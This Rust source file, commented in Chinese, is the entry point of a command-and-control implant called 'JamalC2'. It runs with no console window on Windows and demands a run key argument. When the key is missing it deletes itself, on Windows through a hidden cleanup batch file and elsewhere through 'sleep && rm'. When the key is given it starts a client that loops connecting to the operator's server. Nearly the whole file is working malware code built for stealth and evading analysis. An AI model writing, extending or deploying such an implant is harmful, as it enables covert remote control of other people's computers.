//! JamalC2 Implant
//! 被控端程序

// Windows: 编译时设置为 Windows 子系统，不创建控制台窗口
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod config;
mod sysinfo;
mod client;
mod handlers;

use client::Client;
use std::env;

/// 运行密钥（由 Builder 生成时填入）
const RUN_KEY: &str = "321";

fn main() {
    // 调试：写入日志文件确认是否执行
    let _ = std::fs::write("C:\\temp\\implant_debug.txt", format!(
        "Implant started!\nSKIP_KEY_CHECK: {}\nServer: {}:{}\n",
        config::SKIP_KEY_CHECK,
        config::SERVER_HOST,
        config::SERVER_PORT
    ));
    
    // 检查是否需要验证启动密钥
    let valid = if config::SKIP_KEY_CHECK {
        // 跳过密钥检查，直接运行
        true
    } else {
        // 检查运行参数
        let args: Vec<String> = env::args().collect();
        // 必须提供 -k <key> 参数
        args.len() >= 3 && args[1] == "-k" && args[2] == RUN_KEY
    };
    
    if !valid {
        // 参数错误，执行自删除
        self_delete();
        return;
    }
    
    // Debug 模式下仍然显示日志
    #[cfg(debug_assertions)]
    {
        println!("[*] JamalC2 Implant v{}", config::VERSION);
        println!("[*] Server: {}:{}", config::get_server_host(), config::get_server_port());
        println!("[*] Tag: {}", config::get_tag());
    }
    
    let mut client = Client::new();
    client.connect_loop();
}

/// 自删除：创建批处理文件来删除自身
fn self_delete() {
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        use std::fs;
        use std::io::Write;
        
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        
        // 获取当前可执行文件路径
        if let Ok(exe_path) = env::current_exe() {
            // 在临时目录创建批处理文件
            let temp_dir = env::temp_dir();
            let bat_path = temp_dir.join("cleanup.bat");
            
            // 批处理内容：等待后删除 exe 和自身
            let bat_content = format!(
                r#"@echo off
:loop
del /f /q "{}" 2>nul
if exist "{}" (
    ping 127.0.0.1 -n 2 >nul
    goto loop
)
del /f /q "%~f0"
"#,
                exe_path.display(),
                exe_path.display()
            );
            
            // 写入批处理文件
            if let Ok(mut file) = fs::File::create(&bat_path) {
                if file.write_all(bat_content.as_bytes()).is_ok() {
                    // 执行批处理
                    let _ = Command::new("cmd")
                        .args(["/c", &bat_path.to_string_lossy()])
                        .creation_flags(CREATE_NO_WINDOW)
                        .spawn();
                }
            }
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        use std::process::Command;
        
        // Linux/macOS: 使用 rm 删除
        if let Ok(exe_path) = env::current_exe() {
            let exe_str = exe_path.to_string_lossy();
            let cmd = format!("sleep 1 && rm -f \"{}\"", exe_str);
            let _ = Command::new("sh")
                .args(["-c", &cmd])
                .spawn();
        }
    }
}

